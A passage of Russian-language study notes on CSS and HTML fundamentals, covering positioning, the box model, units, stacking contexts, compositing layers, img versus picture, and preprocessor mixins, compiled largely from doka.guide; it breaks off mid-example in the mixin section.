Способ позиционирования, кажущийся наиболее понятным. Мы просто задаём абсолютное позиционирование и при помощи свойств `left`, `right`, `top`, `bottom` или `inset` регулируем положение элемента. Есть ряд особенностей такого позиционирования:

- Элемент убирается из основного потока документа. То есть перестаёт влиять на положение окружающих элементов и на размер родителя. Можно представить себе, что элемент уходит на слой выше и перестаёт взаимодействовать со всеми элементами, кроме своих потомков.
- Элемент позиционируется относительно ближайшего позиционированного предка. То есть браузер идёт вверх по дереву элементов и ищет ближайшего _опорного_ родителя. И затем располагает наш элемент относительно этого родителя.
- Если элемент был частью строчного контекста форматирования, он приобретает блочный контекст форматирования. К нему становится применима блочная модель.
- Если элемент был блочным и занимал всю ширину своего родителя, то теперь его ширина будет определяться шириной контента.
- Отступы элемента с `position: absolute` не схлопываются с отступами соседних элементов.

[Открыть демо в новой вкладке](https://doka.guide/css/position/demos/absolute/)

###### `fixed`

 Скопировать ссылку "fixed"

Иногда требуется позиционировать элемент не относительно родителя, а относительно окна браузера вне зависимости от вложенности. Для решения подобной задачи подходит `position: fixed`. Свойство так же, как и предыдущее, работает с указанием смещения `left`, `right`, `top`, `bottom` или `inset`. У такого способа позиционирования есть ряд особенностей:

- Элемент убирается из основного потока документа. То есть перестаёт влиять на положение окружающих элементов и на размер родителя. Можно представить себе, что элемент уходит на слой выше и перестаёт взаимодействовать со всеми элементами, кроме своих потомков.
- Элемент позиционируется относительно окна браузера, за исключением случаев, если один из родителей имеет значения свойств [`transform`](https://doka.guide/css/transform/), [`perspective`](https://doka.guide/css/perspective/) или `filter`, отличные от `none`. В этом случае блок становится _опорным_, и позиционирование будет производиться уже относительно него, а не окна браузера.

[Открыть демо в новой вкладке](https://doka.guide/css/position/demos/fixed/)

###### `sticky`

 Скопировать ссылку "sticky"

Элемент позиционируется в нормальном потоке так же, как и статичный, а затем смещается при помощи свойств `left`, `right`, `top`, `bottom` или `inset` относительно ближайшего родителя, имеющего прокрутку. Это свойство применяется, когда нам нужно зафиксировать какой-либо элемент не сразу, а при прокрутке родителя до какого-то известного положения.

Например, в следующем примере элемент будет вести себя как обычно, до тех пор, пока родитель не будет прокручен таким образом, что расстояние от верха родителя до верхней границы элемента не станет меньше 10 пикселей. Как только прокрутка достигнет такого значения, элемент зафиксируется в положении 10 пикселей от верха границы родителя:

`.block {   position: sticky;   top: 10px; }`
Скопировать

У такого позиционирования есть ряд особенностей:

- Элемент ведёт себя как элемент с относительным (`relative`) позиционированием до тех пор, пока его родитель не будет прокручен до определённой границы. Как правило, эта точка совпадает с положением верхней границы нашего элемента, но может быть изменена с использованием свойства `top`.
- Элемент остаётся «приклеенным» во время прокрутки родителя до тех пор, пока не «встретит» противоположную границу своего родителя.

##### **Что такое Box Model?** border-box/content-box
https://doka.guide/css/box-model/

Блочная модель, она же box model — это алгоритм расчёта размеров каждого отдельного элемента на странице, которым браузеры пользуются при отрисовке. Чтобы точно понимать, каким в итоге получится блок и сколько места он займёт, держите в голове следующую картинку:

![Схематичное изображение блочной модели](https://doka.guide/css/box-model/images/box-model-300w.png)

Ровно такую же схему, но в других цветах можно увидеть в инструментах разработчика любого из браузеров. Например, так выглядит блочная модель элемента в Chrome:

![Скриншот блочной модели из инструментов разработчика браузера Chrome](https://doka.guide/css/box-model/images/box-model-chrome-300w.png)

Блочная модель состоит из нескольких CSS-свойств, влияющих на размеры элемента:

- `width` — ширина элемента;
- `height` — высота элемента;
- `padding` — внутренние отступы от контента до краёв элемента;
- `border` — рамка, идущая по краю элемента;
- `margin` — внешние отступы вокруг элемента.

###### Ширина и высота

 Скопировать ссылку "Ширина и высота"

При помощи свойств [`width`](https://doka.guide/css/width/) и [`height`](https://doka.guide/css/height/) можно задавать размеры контентной области блока.

_Контентной областью_ называется условное внутреннее пространство блока, где располагается контент. В примере ниже мы создаём блок при помощи тега [`<div>`](https://doka.guide/html/div/), а внутрь вкладываем контент — текст:

`<div>   Вместе весело шагать по просторам! </div>`
Скопировать

По умолчанию элементы с блочным отображением (`display: block`) занимают всю ширину родителя, если явно не задано другое. А вот высота элемента подстраивается под контент.

Элементы со строчным (`display: inline`) или строчно-блочным (`display: inline-block`) отображениями по умолчанию подстраивают и ширину, и высоту под вложенный контент. Однако строчно-блочному можно и произвольно задать размеры: ширину (`width`) и высоту (`height`).

Если элемент должен занимать больше места, чем вложенный в него контент, то мы меняем его ширину и высоту так, как нам захочется. Напишем стили для примера выше:

`div {   width: 200px;   height: 200px; }`
Скопировать

Теперь элемент будет размером 200 на 200 пикселей.

###### `padding`

 Скопировать ссылку "padding"

Свойство [`padding`](https://doka.guide/css/padding/) отвечает за внутренние отступы. В рамках разговора о блочной модели важно помнить, что по умолчанию внутренние отступы прибавляются к ширине и высоте элемента.

Добавим к стилям из примера выше внутренние отступы:

`div {   width: 200px;   height: 200px;   padding: 25px 15px; }`
Скопировать

Теперь ширина блока будет равна 200 + 15 + 15 = 230 пикселей. А высота будет равна 200 + 25 + 25 = 250 пикселей. Внутренние отступы прибавились к ширине и высоте.

###### `border`

 Скопировать ссылку "border"

При определении размеров элемента в расчёт берутся и рамки, за которые отвечает свойство [`border`](https://doka.guide/css/border/).

Пусть у элемента из примера выше будет рамка со всех сторон:

`div {   width: 200px;   height: 200px;   padding: 25px 15px;   border: 5px solid hotpink; }`
Скопировать

Теперь конечные размеры элемента будут:

- 200 + 15 + 15 + 5 + 5 = 240 пикселей в ширину
- 200 + 25 + 25 + 5 + 5 = 260 пикселей в высоту

###### `margin`

 Скопировать ссылку "margin"

Внешние отступы, за которые отвечает свойство [`margin`](https://doka.guide/css/margin/), не прибавляются непосредственно к размерам элемента, но влияют на то, сколько места на странице он занимает.

Если элементу из нашего примера мы зададим внешние отступы, то он будет занимать больше места, двигая при этом своих соседей:

`div {   width: 200px;   height: 200px;   margin: 50px;   padding: 25px 15px;   border: 5px solid hotpink; }`
Скопировать

###### `box-sizing`

 Скопировать ссылку "box-sizing"

По умолчанию браузеры рассчитывают размеры элемента ровно так, как описано выше, прибавляя внутренние отступы и рамки к ширине и высоте. С этим могут быть связаны неприятные сюрпризы, когда элемент в вёрстке занимает больше места, чем вы ожидаете.

Мы можем поменять стандартное поведение и указать браузеру, что ширина и высота, заданные в CSS, должны включать в себя, в том числе, внутренние отступы и рамки. Делается это при помощи свойства [`box-sizing`](https://doka.guide/css/box-sizing/).
По умолчанию размером элемента считается размер контентной области. Если кроме [`width`](https://doka.guide/css/width/) и [`height`](https://doka.guide/css/height/) указать ещё и [`padding`](https://doka.guide/css/padding/) с [`border`](https://doka.guide/css/border/), то браузер посчитает размер элемента как `width + padding * 2 + border * 2` и `height + padding * 2 + border * 2`.

🤖 Если задать значение `border-box` для свойства `box-sizing`, то браузер изменит принцип расчёта и `padding` с `border` уже будут включены в `width` и `height`.

https://developer.mozilla.org/ru/docs/Web/CSS/CSS_box_model/Introduction_to_the_CSS_box_model


##### Единицы измерения  CSS


https://doka.guide/css/numeric-types/
https://learn.javascript.ru/css-units
https://www.w3.org/Style/Examples/007/units.ru.html

###### Относительные величины

 Скопировать ссылку "Относительные величины"

Используются для задания размера или расстояния относительно чего-либо. Например, `vh` считается относительно высоты вьюпорта (области просмотра страницы в окне браузера).

- [`em`](https://doka.guide/css/rem-em/) задаёт величину относительно вычисленного размера шрифта элемента. Если для элемента `font-size: 20px`, то `2em` будут эквивалентны `40px`. При задании размера шрифта в `em` он считается относительно размера шрифта родительского блока.
- [`rem`](https://doka.guide/css/rem-em/) рассчитывается относительно размера шрифта корневого элемента. Для веб-страницы это [`<html>`](https://doka.guide/html/html/). По умолчанию размер шрифта для `<html>` равен `16px`. При таких условиях `2rem` эквивалентны `32px`.
- [`vh`](https://doka.guide/css/vw-vh/) задаёт размер в процентах от высоты вьюпорта. `1vh` составляет 1% от высоты.
- [`vw`](https://doka.guide/css/vw-vh/) задаёт размер в процентах от ширины вьюпорта. `1vw` составляет 1% от ширины.
- [`vmin`](https://doka.guide/css/vw-vh/) считается относительно меньшей стороны вьюпорта. Если ширина вьюпорта больше высоты, то `vmin` будет считаться относительно высоты. И наоборот. `1vmin` составляет 1% от меньшей стороны вьюпорта.
- [`vmax`](https://doka.guide/css/vw-vh/) считается относительно большей стороны вьюпорта. `1vmax` составляет 1% от большей стороны.
- `ex` задаёт величину относительно метрики шрифта `x-height`. Так называется расстояние между базовой линией шрифта и средней линией строчных букв. Обычно это высота буквы `x` в шрифте, отсюда и название `x-height`. Эту экзотическую величину можно использовать, например, при стилизации верхних или нижних индексов. В примере ниже свойство `bottom` со значением `1ex` поднимет верхний индекс на высоту строчных букв, а со значением `-1ex` опустит нижний индекс вниз

- `cap` считается относительно высоты заглавных букв шрифта.
- `ch` задаёт величину относительно ширины символа `0` (ноль) в шрифте. В моноширинных (с фиксированной шириной символа) шрифтах (Courier, Menlo, Monaco и других) указание размера `10ch` будет в точности соответствовать ширине 10 символов. В других шрифтах будет наблюдаться расхождение, ведь, например, ширина цифры 1 меньше, а ширина буквы Ш — больше ширины символа `0`.
- `ic` — это эквивалент `ch` в восточных языках (китайском, корейском, японском). Задаёт размер относительно размера иероглифа 水 (вода).
- `lh` задаёт размер относительно межстрочного интервала. Если прописано свойство `line-height: 16px`, то `2lh` эквивалентно `32px`.
- `rlh` то же, что и `lh`, но относительно `line-height` элемента `<html>`.

###### Абсолютные величины

 Скопировать ссылку "Абсолютные величины"

Абсолютные величины ни от чего не зависят и привязаны к физическим единицам измерения: дюймам или сантиметрам. Этот факт имеет исторические предпосылки. Когда появились первые программы предпечатной подготовки, возникла необходимость понимать, как картинка на экране будет соответствовать напечатанному варианту. Экраны мониторов в то время были примерно одинаковые, и оказалось, что одному дюйму на экране соответствуют 72 экранных точки. Именно это соотношение зафиксировано в единице измерения `pt`. С развитием технологий улучшались экраны и их разрешение, в один дюйм стало умещаться 96 точек, и это было зафиксировано в `px`.

- `px` соответствуют пикселям на экране. `1px` интерпретируется как 1/96 дюйма.
- `cm` — сантиметры. `1cm` = `96px / 2.54`.
- `in` — дюймы. `1in` = `96px` = `2.54cm`.
- `mm` — миллиметры. `1mm` = `1/10cm`.
- `Q` — четверть миллиметра. `1Q` = `1/40cm`.
- `pc` — пики. `1pc` = `1/16in`.
- `pt` — пункты. `1pt` = `1/72in`.

Абсолютные величины, отличные от пикселей, удобно использовать для вывода на печать.

На сегодняшний день существуют экраны с разной плотностью пикселей и разным разрешением, поэтому соотношение единиц измерения к точкам экрана утратило прежний смысл. Сантиметры и дюймы при выводе на экран не будут соответствовать своим реальным размерам.

###### Единицы измерения углов

 Скопировать ссылку "Единицы измерения углов"

Используются, как правило, для задания угла поворота элемента, направления линейного градиента или угла поворота конического градиента.

- `deg` — градусы угла. Полная окружность содержит 360 градусов. В тригонометрии 0° соответствует пересечению окружности с осью _x_, и градусы отсчитываются против часовой стрелки. В CSS `0deg` соответствует пересечению окружности с осью _y_, а градусы отсчитываются по часовой стрелке:

![Отсчёт градусов в тригонометрии и CSS](https://doka.guide/css/numeric-types/images/angles-300w.png)

- `grad` — градианы. 1/100 от прямого угла (0.9°). Полная окружность содержит 400 градиан. Эта единица измерения чуть удобнее градусов в плане практических расчётов.
- `rad` — радианы. Полная окружность содержит 2π (~6.2832) радиан.
- `turn` — оборот. Полная окружность соответствует одному обороту (`1turn`). Поворот элемента на 90 градусов соответствует `0.25turn`.

###### Единицы измерения времени

 Скопировать ссылку "Единицы измерения времени"

Используются для задания длительности анимации или перехода в свойствах [`animation`](https://doka.guide/css/animation/) и [`transition`](https://doka.guide/css/transition/).

- `ms` — миллисекунда.
- `s` — секунда. `1s` = `1000ms`.

###### Единицы, связанные с разрешением экрана

 Скопировать ссылку "Единицы, связанные с разрешением экрана"

Используются для указания плотности пикселей (разрешения экрана) в медиавыражениях.

- `dpi` — указывает плотность пикселей в точках на дюйм (_dots per inch_). Обычные экраны имеют плотность пикселей 72 или 96dpi, но при печати это разрешение гораздо выше (300 и более точек на дюйм). `1dpi` = `0.39dpcm`. В примере ниже изменим размер шрифта при печати на устройствах с плотностью пикселей больше 300:

`@media print and (min-resolution: 300dpi) {   .element {     font-size: 8pt;   } }`
Скопировать

- `dpcm` — плотность пикселей в точках на сантиметр. `1dpcm` = `2.54dpi`.
- `dppx`, `x` — описывает плотность в точках на `px`. Поскольку соотношение `in` и `px` равно 1/96, `1dppx` = `96dpi`.

###### Проценты

 Скопировать ссылку "Проценты"

Используются, чтобы указать, что значение представляет собой долю от другой величины. Исходное значение, от которого берётся часть, может относиться как к самому элементу, так и к его предку. Всё зависит от того, для какого свойства мы применяем проценты.

Например, при указании `width: 50%` ширина элемента будет высчитана как 50% (половина) от ширины родителя. Но если мы укажем в процентах положение фона `background-position-x: 30%`, это значение будет высчитано относительно ширины самого элемента.

###### Почему лучше использовать `em` и `rem` вместо `px` с точки зрения доступности интерфейса?

Что такое `em`

 Скопировать ссылку "Что такое em"

Единицы `em` в CSS — это относительная единица измерения, которую используют для определения размера элементов, в основном для размера шрифта. Поскольку так задаются размеры относительно родительского элемента, `1em` равен размеру шрифта, установленному в родительском элементе.

Это означает, что если установите размер шрифта в родительском `<div>` как `20px` и размер шрифта дочернего `<div>` как `2em`, размер шрифта в дочернем `<div>` будет равен `40px`.

Что такое `rem`

 Скопировать ссылку "Что такое rem"

`rem` — это ещё одна относительная единица для величины шрифта в CSS. Так как `em` равен размеру пункта текущего шрифта, то `rem` относится к размеру шрифта корневого элемента. Обычно это тег [`<html>`](https://doka.guide/html/html/).

Польза для доступности

 Скопировать ссылку "Польза для доступности"

Единицы `em` и `rem` — масштабируемый и гибкий способ изменения размеров шрифта на странице, в отличие от `px`. Если измените размер шрифта корневого элемента, все элементы, размер которых измеряется с помощью `em` или `rem`, будут автоматически обновлены, чтобы сохранить их относительные значения.

Для того, чтобы шрифты на странице были доступными, рекомендуют использовать относительные единицы вместо абсолютных. Это особенно важно для пользователей, которые изменяют размер шрифта, разрядку букв и размеры других элементов для более удобного чтения и взаимодействия. Так изменение настроек шрифта в браузере пользователя не приведёт к проблемам со стилями, читаемостью или непредсказуемым результатам.

###### Расскажите как соотносятся с размером шрифта `px`, `em` и `rem`?

Пиксель `px` – это абсолютная единица измерения. `1px` интерпретируется как 1/96 дюйма. Главное достоинство использования пикселей для определения размера – чёткость и понятность. Однако, пиксель является фиксированной величиной и не позволяет устанавливать соотношение между различными размерами.

В отличие от `px`, единицы `em` и `rem` – относительные величины.

При задании размера шрифта в `em` он считается относительно размера шрифта родительского блока.  
`1em` равен размеру шрифта, установленному в родительском элементе.

Размер шрифта в `rem` рассчитывается относительно размера шрифта корневого элемента. Для веб-страницы это [`<html>`](https://doka.guide/html/html/).


##### Контекст наложения
https://doka.guide/css/stacking-context/

Контекст наложения — набор правил, на основании которых браузер решает, какой элемент на странице будет выше или ниже других. Условно, если представлять элементы как колоду карт, то правила формирования контекста наложения тасуют колоду. Это одна из основных концепций CSS.

![Слои находятся на разном удалении от взгляда пользователя и могут перекрывать друг друга](https://doka.guide/css/stacking-context/images/stacking-context-300w.png)

Браузер при отрисовке страницы идёт сверху вниз по HTML-разметке и рисует блоки один за другим в том же порядке, в котором они расположены. Мы видим и воспринимаем это как плоский лист, на котором один за другим выстраиваются элементы. Но браузер хитрый и на самом деле он располагает элементы не только по осям _x_ и _y_, но ещё и по оси _z_. По глубине, так сказать.

Вы можете резонно заметить «Монитор же плоский! Какая ещё глубина?». Ваша правда. Но браузеру важно учитывать глубину элементов, чтобы при необходимости правильно наложить их друг на друга.

В стандартной ситуации тот элемент, который находится ниже в HTML-разметке будет ближе к пользователю. Давайте посмотрим на примере. Пусть в нашей разметке будет два блока:

`<div class="block first"></div> <div class="block second"></div>`

И для наглядности мы сдвинем второй блок чуть вверх и вправо:

`.second {   margin-top: -50px;   margin-left: 50px; }`

![[Pasted image 20250504133705.png]]
В результате явно видно, что второй блок перекрывает собою первый, а значит находится выше в _стопке_ элементов по оси _z_.

###### `z-index`

Но мы можем не подчиняться стандартным правилам браузера и устанавливать свой порядок наложения элементов друг на друга. Для этого понадобится свойство [`z-index`](https://doka.guide/css/z-index/).

Перемешаем элементы в нашем примере. Для наглядности добавим третий блок:

```css
<div class="block first"></div> 
<div class="block second"></div> 
<div class="block third"></div>
```
Скопировать

И пусть последний блок и первый блоки перекрывают второй блок. Для этого достаточно добавить позиционирование и `z-index` для первого, а последний и так выше, просто по порядку следования:

```css
.first {   
	position: relative;   z-index: 1; 
}
```
![[Pasted image 20250504133857.png]]

###### Контекст наложения

 Скопировать ссылку "Контекст наложения"

На самом деле уже в предыдущих примерах мы с вами поработали с контекстом наложения. Просто не знали об этом 😅

**Контекст наложения** — это концепция трёхмерного расположения элементов по оси _z_ относительно пользователя, смотрящего на экран.

Самый базовый контекст наложения, существующий на любой странице формируется корневым элементом [`<html>`](https://doka.guide/html/html/). Все элементы внутри этого контекста сортируются и располагаются с оглядкой друг на друга.

Но мы можем создавать контексты наложения не только на странице целиком, но и в каждом отдельном блоке. Тогда вложенные в него дочерние блоки будут сортироваться и располагаться уже по правилам этого нового, родительского контекста наложения.

Новый контекст наложения формируется если:

1. это корневой элемент ([`<html>`](https://doka.guide/html/html/)),
2. элемент позиционирован абсолютно ([`position: absolute`](https://doka.guide/css/position/)) или относительно (`position: relative`) со свойством [`z-index`](https://doka.guide/css/z-index/), значение которого не `auto`,
3. флекс-элемент со свойством `z-index`, значение которого не `auto` и чей родительский элемент имеет свойство [`display: flex`](https://doka.guide/css/flexbox-guide/) или `display: inline-flex`,
4. элементу задано свойство [`opacity`](https://doka.guide/css/opacity/) со значением меньше `1`,
5. элементу задано свойство [`transform`](https://doka.guide/css/transform/) со значением не `none`,
6. элементу задано свойство `mix-blend-mode` со значением не `normal`,
7. элементу задано свойство [`filter`](https://doka.guide/css/filter/) со значением не `none`,
8. элементу задано свойство `isolation` со значением `isolate`,
9. элемент с `position: fixed`,
10. элементу задано свойство [`will-change`](https://doka.guide/css/will-change/) или аналогичный атрибут,
11. элементу задано свойство `-webkit-overflow-scrolling` со значением `touch`.

Остальные элементы, не создающие собственный контекст наложения, используют родительский контекст.

Обычно достаточно запомнить первые три сценария и чуть-чуть помнить про следующие два. Если браузер рисует что-то, чего вы не ожидали, можно всегда вернуться и подсмотреть остальные.
###### Порядок наложения

 Скопировать ссылку "Порядок наложения"

Внутри каждого контекста наложения существует свой порядок отрисовки элементов и их компонентов. Ниже перечисление идёт от самого нижнего слоя, до самого верхнего:

1. Фон ([`background`](https://doka.guide/css/background/)) и рамки элемента ([`border`](https://doka.guide/css/border/));
2. Позиционированные элементы (включая потомков), у которых значение свойства `z-index` меньше 0;
3. Элементы без контекста наложения с `display: block`;
4. Элементы со свойством [`float`](https://doka.guide/css/float/);
5. Элементы с `display: inline`;
6. Элементы (включая потомков) с `z-index: auto` или `z-index: 0`, а также элементы с `opacity` меньше 1;
7. Элементы (включая потомков) с `z-index` больше 0.

Согласно этому порядку, элемент с отрицательным значением `z-index` никогда не будет ниже фона или рамки родительского элемента.






##### Как вынести элемент в отдельный слой

https://habr.com/ru/companies/skillfactory/articles/654715/

В CSS можно вынести элемент в отдельный слой с помощью свойства **`isolation`** или **`will-change`**, а также принудительно создать новый слой с помощью **`transform`**, **`opacity`** или других свойств, которые создают **"stacking context"** (контекст наложения).  

###### **1. Создание нового слоя с помощью `isolation`**  
Свойство `isolation: isolate` создает новый контекст наложения, что полезно для управления z-index:  
```css
.element {
  isolation: isolate; /* Создает новый stacking context */
  z-index: 10; /* Теперь z-index работает внутри этого контекста */
}
```

###### **2. Принудительное создание слоя с `will-change`**  
Оптимизация рендеринга с помощью `will-change` (может ускорить анимации):  
```css
.element {
  will-change: transform, opacity; /* Браузер заранее выделит слой */
}
```
⚠️ **Важно:** Не злоупотребляйте `will-change`, так как это может увеличить потребление памяти.  

###### **3. Создание слоя через `transform` или `opacity`**  
Некоторые свойства автоматически создают новый слой:  
```css
.element {
  transform: translateZ(0); /* Аппаратное ускорение (может создать слой) */
  /* или */
  opacity: 0.999; /* Не 1, чтобы браузер оптимизировал */
}
```

###### **4. Использование `contain` для оптимизации**  
Свойство `contain` ограничивает область перерисовки и может помочь в производительности:  
```css
.element {
  contain: paint; /* Браузер не будет перерисовывать элементы вне этого блока */
}
```

###### **Когда это полезно?**  
- При анимациях (`transform`, `opacity`) для плавности.  
- При работе с `z-index`, чтобы избежать конфликтов.  
- Для оптимизации рендеринга сложных компонентов.  

Если вам нужно управлять слоями глобально (например, в `@layer`), используйте **CSS Cascade Layers**:  
```css
@layer utilities {
  .element {
    /* Стили в отдельном слое */
  }
}
```

Выбор метода зависит от задачи:  
- **Для анимаций** → `will-change`, `transform`.  
- Для **управления z-index** → `isolation`.  
- Для **оптимизации рендеринга** → `contain`.  

###### **Зачем выносить элементы в отдельные слои?**
###### **1. Ускорение анимаций и переходов**
Когда браузер рендерит страницу, он проходит несколько этапов:
1. **Layout** (расчёт геометрии)  
2. **Paint** (отрисовка пикселей)  
3. **Composite** (композиция слоёв)  

Если элемент находится в **отдельном слое**, браузер может пропускать этапы **Layout** и **Paint** при анимациях `transform` и `opacity`, что делает анимации плавными (60 FPS).  

**Пример:**  
```css
.box {
  will-change: transform; /* Браузер заранее выделит слой */
  /* или */
  transform: translateZ(0); /* "Хак" для создания слоя */
}
```
→ Анимация `transform: scale()` или `opacity` будет работать на GPU.

###### **2. Избежание "дёрганий" при прокрутке**
Элементы с `position: fixed`, `sticky` или сложные анимации могут тормозить, если браузер постоянно пересчитывает их положение. Вынос в отдельный слой уменьшает нагрузку на CPU.

###### **3. Контроль над `z-index` (изоляция контекста наложения)**
Если у вас сложная вёрстка с множеством `z-index`, `isolation: isolate` помогает избежать неожиданного перекрытия элементов.

---

###### **Как браузер использует GPU?**
Когда элемент становится **композитным слоем**, браузер может отдать его рендеринг **графическому процессору (GPU)**. Это особенно полезно для:
- Плавных анимаций (`transform`, `opacity`).  
- Параллакс-эффектов.  
- Сложных `position: sticky` / `fixed`-элементов.  

**Но!** GPU рендеринг ≠ волшебная оптимизация.  
→ Каждый слой потребляет видеопамять (особенно на мобильных устройствах).  
→ Слишком много слоёв могут **замедлить** страницу.

---

###### **Когда это действительно нужно?**
✅ **Анимации** (`transform`, `opacity`, `filter`).  
✅ **Фиксированные элементы** (например, шапка сайта).  
✅ **Сложные интерфейсы** (кастомные скроллы, canvas, WebGL).  

❌ **Не нужно** применять ко всем элементам подряд – это может **увеличить потребление памяти** и даже замедлить страницу.

---

###### **Как проверить, что элемент в отдельном слое?**
1. **Chrome DevTools** → **Layers** (вкладка в "Инструментах разработчика").  
2. **Edge/Chrome** → `F12` → **Rendering** → **Layer borders** (покажет слои цветными рамками).  

Если элемент стал отдельным слоем, вы увидите его в списке.

---

###### **Вывод**
Вынос в отдельный слой **ускоряет анимации и сложные эффекты**, но требует баланса.  
**Лучшие практики:**  
- Используйте `will-change` или `transform: translateZ(0)` **только для анимируемых элементов**.  
- Не злоупотребляйте – слишком много слоёв = больше нагрузки на GPU.  
- Проверяйте в DevTools, действительно ли элемент стал слоем.  

Если нужно ускорить анимацию – это отличный способ. Если нет – лучше не создавать лишние слои. 🚀

##### Image / picture

https://doka.guide/html/picture/
https://habr.com/ru/companies/vdsina/articles/555736/

В CSS и HTML есть два элемента для работы с изображениями — `<img>` и `<picture>`. Они похожи, но служат разным целям. Разберём их ключевые отличия, плюсы и минусы, а также когда какой использовать.

---

###### **1. `<img>` — обычное изображение**
###### **Как работает?**
```html
<img src="image.jpg" alt="Описание" width="800" height="600">
```
- Загружает **одну версию** изображения.
- Подходит для статичных картинок без адаптации под разные устройства.

###### **Плюсы:**
- Простота использования.
- Поддержка во всех браузерах.
- Можно стилизовать через CSS (`border`, `filter`, `object-fit` и др.).

###### **Минусы:**
- Нет адаптивности под разные разрешения экрана.
- Если изображение слишком большое для мобильных — тратится лишний трафик.
- Если слишком маленькое для десктопа — выглядит размытым.

---

###### **2. `<picture>` — адаптивное изображение**
###### **Как работает?**
```html
<picture>
  <source media="(min-width: 1200px)" srcset="large.jpg">
  <source media="(min-width: 768px)" srcset="medium.jpg">
  <source srcset="small.jpg">
  <img src="fallback.jpg" alt="Описание"> <!-- Фолбэк -->
</picture>
```
- Позволяет загружать **разные изображения** в зависимости от:
  - **Размера экрана** (`media`).
  - **Плотности пикселей** (`srcset`).
  - **Формата изображения** (WebP, AVIF, JPEG и др.).

###### **Плюсы:**
- **Оптимизация загрузки** (меньший вес на мобильных).
- Поддержка **современных форматов** (WebP, AVIF) с фолбэком.
- Можно делать **арт-дирекшн** (разные картинки для разных экранов).

###### **Минусы:**
- Сложнее в вёрстке.
- Не всегда нужен (если изображение простое).

---

###### **3. Ключевые отличия**
| Характеристика       | `<img>`                          | `<picture>`                      |
|----------------------|----------------------------------|----------------------------------|
| **Адаптивность**     | Нет (одно изображение)           | Да (разные версии под экраны)    |
| **Оптимизация**      | Нет (может грузить лишнее)       | Да (загружает оптимальный вариант) |
| **Форматы**         | Только указанный в `src`         | Поддержка WebP/AVIF с фолбэком   |
| **Арт-дирекшн**      | Нет                              | Да (можно менять картинку)       |
| **Сложность**        | Просто                          | Сложнее (нужно прописывать `source`) |

---

###### **4. Когда что использовать?**
###### **Используйте `<img>`, если:**
- Изображение **простое** (иконка, логотип, фон).
- Нет требований к адаптивности.
- Нужна максимальная простота.

###### **Используйте `<picture>`, если:**
- Нужна **адаптивность** (разные размеры для мобильных и десктопов).
- Хотите **сэкономить трафик** (загрузка WebP вместо JPEG).
- Нужен **арт-дирекшн** (например, обрезанная версия для мобильных).

---

###### **5. Пример: Оптимизация с `<picture>`**
```html
<picture>
  <!-- AVIF (если поддерживается) -->
  <source type="image/avif" srcset="image.avif">
  
  <!-- WebP (если AVIF не поддерживается) -->
  <source type="image/webp" srcset="image.webp">
  
  <!-- Фолбэк для старых браузеров -->
  <img src="image.jpg" alt="Пример" loading="lazy">
</picture>
```
→ Браузер выберет самый оптимальный формат.

---

###### **6. CSS для `<img>` и `<picture>`**
Оба элемента можно стилизовать:
```css
img, picture {
  max-width: 100%;
  height: auto;
  border-radius: 8px;
}

/* object-fit для управления обрезкой */
img {
  object-fit: cover;
}
```

---

###### **Вывод**
- `<img>` — **простое решение** для статичных изображений.  
- `<picture>` — **гибкий инструмент** для адаптивности и оптимизации.  

Выбирайте `<picture>`, если важно:  
✅ Адаптивное изображение.  
✅ Оптимизация загрузки.  
✅ Поддержка современных форматов.  

Для всего остального достаточно `<img>`. 🖼️


##### CSS-препроцессоры
https://doka.guide/tools/preprocessors/

Препроцессор — это инструмент, который расширяет стандартные возможности CSS с помощью новых синтаксических конструкций, таких как миксины, циклы, переменные и другие. Препроцессоры так называются потому, что принимают данные (ваш код в формате _stylus_, _sass_, _scss_ или _less_) и потом компилируют (преобразуют) их в обычный CSS-код. Этим они отличаются от постпроцессоров, которые улучшают именно CSS. К примеру, подставляют вендорные префиксы.

Основные препроцессоры — это [Sass](https://sass-lang.com/), [Less](https://lesscss.org/) и [Stylus](https://stylus-lang.com/). У них различные синтаксисы, а Sass поддерживает два: sass и SCSS.

CSS пока ещё нет поддержки миксинов, с помощью которых можно добавлять адаптивность сайту, вынося отдельные стили и «примешивая» их потом.

###### `@extend`

Во всех препроцессорах есть интересная фича — `@extend`. С её помощью расширяют классы за счёт других. С одной стороны, это удобно и сокращает количество написанного кода, с другой, если неправильно использовать фичу, это приведёт к хаосу в организации кода. Станет трудно разобраться, какие CSS-стили получатся в итоге. Дело в том, что из-за `@extend` возникает неявная связанность между оригинальными классами и теми классами, которые их расширяют. Изменяя стили из первоначального класса, мы автоматически вносим изменения и во все другие, которые содержат расширения. Так что, при большом количестве расширений, стили могут измениться сразу в нескольких местах. Важно следить за тем, есть ли у родительских стилей зависимость от дочерних. Таким образом, при использовании `@extend` стоит сначала подумать, будет ли это хорошим решением для конкретного проекта, и действительно ли оно упрощает вашу работу.

###### Миксины

Миксины (mixins) похожи на функции в языках программирования. В них передают аргументы, задают им значения по умолчанию и так далее. Миксины помогают группировать нужные стили и повторно использовать их в нескольких местах кода или в разных CSS-файлах. Это пригодится, когда в проекте ну очень много стилей и строк кода, сложная логика вычисления значений для CSS-свойств, а ещё когда хотите подстраховаться и не споткнуться об разные особенности отрисовки стилей в браузерах.



##### Миксины

https://sass-lang.su/documentation/at-rules/mixin

https://ru.hexlet.io/courses/css-sass/lessons/mixin/theory_unit

https://sass-scss.ru/documentation/miksini/ispolzovanie_miksina/

###### Миксины в CSS-препроцессорах: Полное руководство

Миксины (mixins) — это одна из самых мощных возможностей CSS-препроцессоров, позволяющая создавать переиспользуемые блоки стилей с возможностью параметризации.

###### Что такое миксины?

Миксины можно сравнить с функциями в программировании — это фрагменты кода, которые:
1. Можно многократно использовать
2. Можно параметризировать
3. Можно включать в различные селекторы

###### Синтаксис миксинов в разных препроцессорах

###### В Sass/SCSS
```scss
// Объявление миксина
@mixin border-radius($radius) {
  border-radius: $radius;
  -webkit-border-radius: $radius;
  -moz-border-radius: $radius;
}

// Использование
.button {
  @include border-radius(10px);
}
```

###### В Less
```less
// Объявление
.border-radius(@radius) {
  border-radius: @radius;
  -webkit-border-radius: @radius;
  -moz-border-radius: @radius;
}

// Использование
.button {
  .border-radius(10px);
}
```

###### В Stylus
```stylus
// Объявление
border-radius(radius)
  border-radius radius
  -webkit-border-radius radius
  -moz-border-radius radius

// Использование
.button
  border-radius(10px)
```

###### Возможности миксинов

###### 1. Параметры по умолчанию
```scss
@mixin box-shadow($x: 0, $y: 0, $blur: 5px, $color: #000) {
  box-shadow: $x $y $blur $color;
}

.card {
  @include box-shadow($y: 10px);
}
```

###### 2. Несколько параметров
```scss
@mixin position($position, $top: null, $right: null, $bottom: null, $left: null) {
  position: $position;
  top: $top;
  right: $right;
  bottom: $bottom;
